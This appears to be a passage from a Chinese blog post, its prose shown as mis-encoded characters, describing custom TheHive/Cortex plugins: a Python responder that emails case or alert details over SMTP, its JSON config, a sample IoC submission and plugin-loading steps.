<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> mistune</span><br><span class="line"><span class="keyword">from</span> cortexutils.responder <span class="keyword">import</span> Responder</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mail</span>(<span class="params">Responder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.__init__(self)</span><br><span class="line">        self.smtp_host = self.get_param(<span class="string">&quot;config.smtp_host&quot;</span>, <span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">        self.smtp_port = self.get_param(<span class="string">&quot;config.smtp_port&quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br><span class="line">        self.mail_from = self.get_param(</span><br><span class="line">            <span class="string">&quot;config.from&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;Missing sender email address&quot;</span></span><br><span class="line">        )</span><br><span class="line">        self.smtp_user = self.get_param(<span class="string">&quot;config.smtp_user&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.smtp_pwd = self.get_param(<span class="string">&quot;config.smtp_pwd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.thehive_url = self.get_param(<span class="string">&quot;config.thehive_url&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_links</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create TheHive links</span></span><br><span class="line"><span class="string">        :rtype: String</span></span><br><span class="line"><span class="string">        :return: URL</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/details&quot;</span>.<span class="built_in">format</span>(case_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.run(self)</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            title = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = self.get_param(<span class="string">&quot;data.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>]:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.message&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task logs description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;alert description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&quot;Invalid dataType&quot;</span>)</span><br><span class="line"></span><br><span class="line">        mail_to = []</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in case tags</span></span><br><span class="line">            tags = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.tags&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in tags&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_tags = [t[<span class="number">5</span>:] <span class="keyword">for</span> t <span class="keyword">in</span> tags <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in tags&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>]:</span><br><span class="line">            <span class="comment"># Search recipient address in tasks description</span></span><br><span class="line">            descr_array = description.splitlines()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;mailto:&quot;</span> <span class="keyword">in</span> descr_array[<span class="number">0</span>]:</span><br><span class="line">                mail_str = descr_array[<span class="number">0</span>].replace(<span class="string">&quot;mailto:&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">                mail_to = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> mail_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in description&quot;</span>)</span><br><span class="line">            <span class="comment"># Set rest of description as body</span></span><br><span class="line">            description = <span class="string">&quot;\n&quot;</span>.join(descr_array[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in artifacts</span></span><br><span class="line">            artifacts = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.artifacts&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in observables&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_artifacts = [</span><br><span class="line">                a[<span class="string">&quot;data&quot;</span>] </span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> artifacts </span><br><span class="line">                <span class="keyword">if</span> a.get(<span class="string">&quot;dataType&quot;</span>) == <span class="string">&quot;mail&quot;</span> <span class="keyword">and</span> <span class="string">&quot;data&quot;</span> <span class="keyword">in</span> a</span><br><span class="line">            ]</span><br><span class="line">            mail_tags = [</span><br><span class="line">                t[<span class="number">5</span>:]</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> mail_artifacts</span><br><span class="line">                <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)</span><br><span class="line">            ]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in observables&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span class="string">&quot;Subject&quot;</span>] = title</span><br><span class="line">        msg[<span class="string">&quot;From&quot;</span>] = self.mail_from</span><br><span class="line">        msg[<span class="string">&quot;To&quot;</span>] = <span class="string">&#x27;,&#x27;</span>.join(mail_to)</span><br><span class="line">        <span class="comment"># Markdown to HTML</span></span><br><span class="line">        content = mistune.markdown(description, escape=<span class="literal">True</span>, hard_wrap=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># add TheHive Links</span></span><br><span class="line">        links = self.create_links()</span><br><span class="line">        content += <span class="string">&#x27;\n&lt;p&gt;&lt;a href=&quot;&#123;&#125;&quot;&gt;Click me to TheHive&lt;/a&gt;&lt;/p&gt;\n&#x27;</span>.<span class="built_in">format</span>(links)</span><br><span class="line">        msg.attach(MIMEText(content, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.smtp_user <span class="keyword">and</span> self.smtp_pwd:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                context = ssl.create_default_context()</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.starttls(context=context)</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">            <span class="keyword">except</span> smtplib.SMTPNotSupportedError:</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line"></span><br><span class="line">        self.report(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;message sent&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operations</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        <span class="keyword">return</span> [self.build_operation(<span class="string">&quot;AddTagToCase&quot;</span>, tag=<span class="string">&quot;mail sent&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Mail().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em>Mail.json</em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Send an email with information from a TheHive case or alert&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:alert&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;Mail/mail.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;from&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;email address from which the mail is send&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_host&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server used to send mail&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">25</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;user&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_pwd&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server password&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;pwd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;thehive_url&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;TheHive server address&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;http://localhost:9000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Threat-Intelligence"><a href="#Threat-Intelligence" class="headerlink" title="Threat Intelligence"></a>Threat Intelligence</h3><p>â€‹    å…¶å®é»˜è®¤<em>TheHive</em>æ˜¯æ¨èä¸<em>MISP</em>è¿›è¡Œå¯¹æ¥å®ç°æƒ…æŠ¥çš„<em>feed</em>ã€‚ç”±äºæˆ‘ä»¬è‡ªå»ºäº†å¨èƒæƒ…æŠ¥åº“ï¼Œæ‰€ä»¥å†™äº†ä¸€ä¸ªRespondersæ’ä»¶ï¼Œå¸®åŠ©åœ¨åˆ†ææ—¶æäº¤IoCæƒ…æŠ¥ã€‚è¿™è¾¹ä»£ç å°±ä¸ä¸Šäº†ã€‚ç»™å‡ºä¸€ä¸ªæäº¤çš„ç”¨ä¾‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ioc&quot;</span>: <span class="string">&quot;193.142.146.143&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;burp scan&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;è¯¥IPåœ¨çŸ­æ—¶é—´å†…å¯¹ç”¨æˆ·ç™»å½•æ¥å£å‘èµ·å¤§é‡è®¿é—®ï¼Œä¸”åŒ…å«ç€å¤§é‡ç™»å½•å¤±è´¥çš„æƒ…å†µ&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;producer&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;provider&quot;</span>: <span class="string">&quot;TheHive&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;creation_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;modification_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;expiration_time&quot;</span>: <span class="string">&quot;2021-05-29T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;meta&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;case&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;å®‰å…¨åˆ†æ - å‘¨æŠ¥ï¼ˆ05.10-05.14ï¼‰&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;link&quot;</span>: <span class="string">&quot;https://127.0.0.1:9000/index.html#!/case/~43769904/observables/~463080&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å¦‚ä½•å¯ç”¨æ’ä»¶"><a href="#å¦‚ä½•å¯ç”¨æ’ä»¶" class="headerlink" title="å¦‚ä½•å¯ç”¨æ’ä»¶"></a>å¦‚ä½•å¯ç”¨æ’ä»¶</h2><h3 id="åŠ è½½æ’ä»¶"><a href="#åŠ è½½æ’ä»¶" class="headerlink" title="åŠ è½½æ’ä»¶"></a>åŠ è½½æ’ä»¶</h3><ul>
<li>æ’ä»¶è·¯å¾„<ul>
<li> <code>/etc/cortex/Cortex-Analyzers/analyzers</code></li>
<li><code>/etc/cortex/Cortex-Analyzers/responders</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ll /etc/cortex/Cortex-Analyzers/analyzers</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:48 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ProxyCheck/</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ThreatBook/</span><br><span class="line"></span><br><span class="line">$ ll /etc/cortex/Cortex-Analyzers/responders</span><br><span class="line">drwxr-xr-x  6 root root 4096 May  5 01:49 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:49 Mail/</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<code>/etc/cortex/application.conf</code></p>
<p>å»ºè®®å¤§å®¶å°†æ–°å¢çš„æ’ä»¶ä¸å®˜æ–¹çš„æ’ä»¶åŒºåˆ«å¼€ï¼Œè¿™æ ·åæœŸä¹Ÿä¾¿äºç»´æŠ¤ã€‚</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span>	<span class="comment"># æ–°å¢è‡ªå®šä¹‰æ’ä»¶</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span>	<span class="comment"># æ–°å¢è‡ªå®šä¹‰æ’ä»¶</span></span><br><span class="line">  ]</span><br><span 